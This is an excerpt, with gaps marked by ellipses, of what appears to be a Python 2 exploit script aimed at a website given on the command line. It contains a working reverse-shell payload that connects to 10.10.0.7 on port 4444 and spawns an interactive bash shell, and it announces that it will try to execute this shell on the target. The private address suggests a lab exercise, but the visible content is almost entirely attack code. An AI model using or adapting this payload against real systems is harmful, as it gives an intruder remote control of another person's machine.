...
if len(sys.argv) != 2:
    print "USAGE: python2 %s <website>" % (sys.argv[0])
    sys.exit(-1)
...
cmd = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'''
...
print "[+] Script will try executing reverse shell on %s" % (sys.argv[1])
